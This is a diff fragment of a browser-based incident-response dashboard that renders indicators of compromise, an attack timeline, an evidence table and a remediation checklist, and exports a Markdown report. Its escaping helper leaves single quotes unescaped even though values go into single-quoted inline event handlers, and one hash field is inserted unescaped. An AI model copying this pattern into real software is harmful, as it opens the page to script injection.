+                </span>
+                ${getSeverityBadgeHTML(ioc.severity)}
+              </div>
+              <div onclick="copyTextToClipboard('${escapeHtml(ioc.value)}')" class="font-mono text-xs sm:text-sm text-white font-bold break-all hover:text-[#95D600] cursor-pointer pt-1" title="Click to copy indicator">
+                ${escapeHtml(ioc.value)}
+              </div>
+            </div>
+            <label class="inline-flex items-center gap-1.5 cursor-pointer shrink-0 font-mono text-[11px] text-zinc-400">
+              <input type="checkbox" ${ioc.included ? 'checked' : ''} onchange="toggleIocInclusion('${ioc.id}')" class="accent-[#95D600] w-4 h-4 rounded cursor-pointer" />
+              <span>REPORT</span>
+            </label>
+          </div>
+          <div class="border-t border-[#181f17] pt-2 flex flex-col sm:flex-row sm:items-center justify-between gap-1 text-[11px] font-mono">
+            <span class="text-[#39FF14]">${escapeHtml(ioc.mitre)}</span>
+            <span class="text-zinc-400 truncate">${escapeHtml(ioc.context)}</span>
+          </div>
+        </div>
+      `).join('');
+
+      // Render Timeline Events
+      const timelineContainer = document.getElementById('timeline-container');
+      timelineContainer.innerHTML = appState.timeline.map(evt => `
+        <div class="relative pl-10 sm:pl-14">
+          <!-- Timeline Node Dot -->
+          <div class="absolute left-2.5 sm:left-4.5 top-4 w-3.5 h-3.5 rounded-full ${evt.included ? 'bg-[#95D600] shadow-[0_0_10px_#95D600]' : 'bg-zinc-700'} border-2 border-[#050505]"></div>
+
+          <div class="p-4 rounded-xl bg-[#090c09] border ${evt.included ? 'border-[#222e1f]' : 'border-zinc-900 opacity-55'} space-y-2.5">
+            <div class="flex flex-wrap items-center justify-between gap-2">
+              <div class="flex flex-wrap items-center gap-2">
+                <input type="checkbox" ${evt.included ? 'checked' : ''} onchange="toggleTimelineEvent('${evt.id}')" class="accent-[#95D600] w-4 h-4 cursor-pointer" title="Include in Executive Report" />
+                <span class="font-mono text-xs text-[#95D600] font-bold">${escapeHtml(evt.timestamp)}</span>
+                <span class="px-2 py-0.5 rounded bg-zinc-900 border border-zinc-700 font-mono text-[10px] text-zinc-300">${escapeHtml(evt.mitre)}</span>
+              </div>
+
+              <select onchange="updateTimelineSeverity('${evt.id}', this.value)" class="bg-[#0e120e] border border-[#253023] rounded px-2 py-1 text-[11px] font-mono font-bold text-white focus:outline-none focus:border-[#95D600]">
+                ${['LOW', 'ELEVATED', 'CRITICAL', 'BEAST-TIER'].map(level =>
+                  `<option value="${level}" ${evt.severity === level ? 'selected' : ''}>${level}</option>`
+                ).join('')}
+              </select>
+            </div>
+
+            <div class="font-display font-bold text-base text-white">${escapeHtml(evt.title)}</div>
+
+            <div>
+              <label class="block text-[10px] font-mono text-zinc-500 uppercase mb-1">ANALYST TRIAGE NOTE (SYNCED TO REPORT)</label>
+              <input type="text" value="${escapeHtml(evt.note)}" oninput="updateTimelineNote('${evt.id}', this.value)" class="w-full bg-[#060806] border border-[#1c241b] focus:border-[#95D600] rounded px-3 py-1.5 text-xs font-mono text-zinc-300 focus:outline-none" />
+            </div>
+          </div>
+        </div>
+      `).join('');
+    }
+
+    function toggleTimelineEvent(id) {
+      const evt = appState.timeline.find(e => e.id === id);
+      if (evt) {
+        evt.included = !evt.included;
+        renderTriageView();
+      }
+    }
+
+    function updateTimelineSeverity(id, newSeverity) {
+      const evt = appState.timeline.find(e => e.id === id);
+      if (evt) {
+        evt.severity = newSeverity;
+        showToast(`Severity updated to ${newSeverity}`);
+      }
+    }
+
+    function updateTimelineNote(id, newNote) {
+      const evt = appState.timeline.find(e => e.id === id);
+      if (evt) evt.note = newNote;
+    }
+
+    function addCustomTimelineEvent() {
+      const now = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
+      appState.timeline.push({
+        id: 'evt-' + Date.now(),
+        timestamp: now,
+        title: 'Analyst Manual Investigation Milestone',
+        mitre: 'T1082',
+        severity: 'ELEVATED',
+        note: 'Verified memory artifacts and confirmed zero lateral spread to backup VLAN.',
+        included: true
+      });
+      renderTriageView();
+      showToast('Added custom timeline milestone.');
+    }
+
+    // -------------------------------------------------------------------------
+    // 6. REPORT DOSSIER RENDERING & MARKDOWN EXPORT
+    // -------------------------------------------------------------------------
+    function renderReportView() {
+      const nowStr = new Date().toISOString().replace('T', ' ').slice(0, 16) + ' UTC';
+      document.getElementById('report-timestamp').textContent = `GENERATED: ${nowStr}`;
+
+      // Evidence Table
+      const evTbody = document.getElementById('report-evidence-tbody');
+      evTbody.innerHTML = appState.artifacts.map(art => `
+        <tr>
+          <td class="py-2.5 px-3 font-bold text-white">${escapeHtml(art.filename)}</td>
+          <td class="py-2.5 px-3">${escapeHtml(art.type)}</td>
+          <td class="py-2.5 px-3 text-zinc-400 break-all">${art.hash}</td>
+          <td class="py-2.5 px-3">${getSeverityBadgeHTML(art.severity)}</td>
+        </tr>
+      `).join('') || `<tr><td colspan="4" class="py-3 px-3 text-zinc-500">No artifacts attached.</td></tr>`;
+
+      // Verified IOCs Table
+      const includedIocs = appState.iocs.filter(i => i.included);
+      const iocTbody = document.getElementById('report-ioc-tbody');
+      iocTbody.innerHTML = includedIocs.map(ioc => `
+        <tr>
+          <td class="py-2.5 px-3 font-bold text-[#95D600]">${escapeHtml(ioc.type)}</td>
+          <td class="py-2.5 px-3 text-white break-all">${escapeHtml(ioc.value)}</td>
+          <td class="py-2.5 px-3">${escapeHtml(ioc.mitre)}</td>
+          <td class="py-2.5 px-3 text-zinc-400">${escapeHtml(ioc.context)}</td>
+        </tr>
+      `).join('') || `<tr><td colspan="4" class="py-3 px-3 text-zinc-500">No IOCs selected for report.</td></tr>`;
+
+      // Timeline List
+      const includedEvents = appState.timeline.filter(e => e.included);
+      const tlList = document.getElementById('report-timeline-list');
+      tlList.innerHTML = includedEvents.map(evt => `
+        <div class="p-3.5 rounded-xl bg-[#080a08] border border-[#1f261e] flex flex-col sm:flex-row sm:items-start justify-between gap-2">
+          <div class="space-y-1">
+            <div class="flex flex-wrap items-center gap-2 font-mono text-xs">
+              <span class="text-[#95D600] font-bold">${escapeHtml(evt.timestamp)}</span>
+              <span class="text-zinc-500">|</span>
+              <span class="text-zinc-300 font-bold">${escapeHtml(evt.mitre)}</span>
+            </div>
+            <div class="font-display font-bold text-sm text-white">${escapeHtml(evt.title)}</div>
+            <p class="text-xs text-zinc-400 font-mono">${escapeHtml(evt.note)}</p>
+          </div>
+          <div class="shrink-0">${getSeverityBadgeHTML(evt.severity)}</div>
+        </div>
+      `).join('') || `<p class="text-xs font-mono text-zinc-500">No timeline events selected.</p>`;
+
+      // Remediation Checklist
+      renderRemediationList();
+    }
+
+    function renderRemediationList() {
+      const doneCount = appState.remediation.filter(r => r.done).length;
+      document.getElementById('remediation-progress-label').textContent = `${doneCount} / ${appState.remediation.length} COMPLETED`;
+
+      const remList = document.getElementById('remediation-list');
+      remList.innerHTML = appState.remediation.map(rem => `
+        <label class="flex items-center gap-3 p-3 rounded-xl bg-[#080a08] border border-[#1f261e] hover:border-[#95D600]/40 cursor-pointer transition">
+          <input type="checkbox" ${rem.done ? 'checked' : ''} onchange="toggleRemediation('${rem.id}')" class="accent-[#95D600] w-4 h-4 rounded cursor-pointer" />
+          <span class="text-xs sm:text-sm font-mono ${rem.done ? 'line-through text-zinc-500' : 'text-zinc-200'}">${escapeHtml(rem.text)}</span>
+        </label>
+      `).join('');
+    }
+
+    function toggleRemediation(id) {
+      const item = appState.remediation.find(r => r.id === id);
+      if (item) {
+        item.done = !item.done;
+        renderRemediationList();
+      }
+    }
+
+    function copyReportMarkdown() {
+      const caseId = document.getElementById('meta-incident-id').value;
+      const lead = document.getElementById('meta-lead').value;
+      const actor = document.getElementById('meta-actor').value;
+      const status = document.getElementById('meta-status').value;
+      const summary = document.getElementById('report-exec-summary').value;
+
+      const includedIocs = appState.iocs.filter(i => i.included);
+      const includedEvents = appState.timeline.filter(e => e.included);
+
+      const md = [
+        `# MONSTER // IR-OPS — INCIDENT RESPONSE DOSSIER`,
+        `**Case ID:** ${caseId} | **Lead Responder:** ${lead}`,
+        `**Threat Cluster:** ${actor} | **Status:** ${status}`,
+        ``,
+        `## 01. Executive Summary`,
+        summary,
+        ``,
+        `## 02. Forensic Evidence Inventory`,
+        ...appState.artifacts.map(a => `- **${a.filename}** (${a.type}) — \`SHA256: ${a.hash}\` [${a.severity}]`),
+        ``,
+        `## 03. Verified Indicators of Compromise (IOCs)`,
+        ...includedIocs.map(i => `- **[${i.type}]** \`${i.value}\` — *${i.mitre}* (${i.context})`),
+        ``,
+        `## 04. Reconstructed Attack Timeline`,
+        ...includedEvents.map(e => `- **${e.timestamp}** [${e.severity}] **${e.title}** (${e.mitre}): ${e.note}`),
+        ``,
+        `## 05. Containment & Remediation Checklist`,
+        ...appState.remediation.map(r => `- [${r.done ? 'x' : ' '}] ${r.text}`)
+      ].join('\n');
+
+      copyTextToClipboard(md);
+      showToast('Full Incident Response Report copied as Markdown!');
+    }
+
+    function resetToDemoScenario() {
+      appState = JSON.parse(JSON.stringify(INITIAL_STATE));
+      document.getElementById('meta-incident-id').value = 'IR-2026-0894-BEAST';
+      syncIncidentBadge('IR-2026-0894-BEAST');
+      renderIngestView();
+      renderTriageView();
+      renderReportView();
+      appendTerminalLog(`<span class="text-[#95D600]">[RESET]</span> Restored pre-loaded Operation VenomLock incident dataset.`);
+      showToast('Scenario reset to Operation VenomLock baseline.');
+    }
+
+    function escapeHtml(str) {
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;');
+    }
+
+    // Boot Application
+    window.addEventListener('DOMContentLoaded', () => {
+      renderIngestView();
+      renderTriageView();
+      renderReportView();
+      switchView('ingest');
+    });
+  </script>
+</body>
+</html>
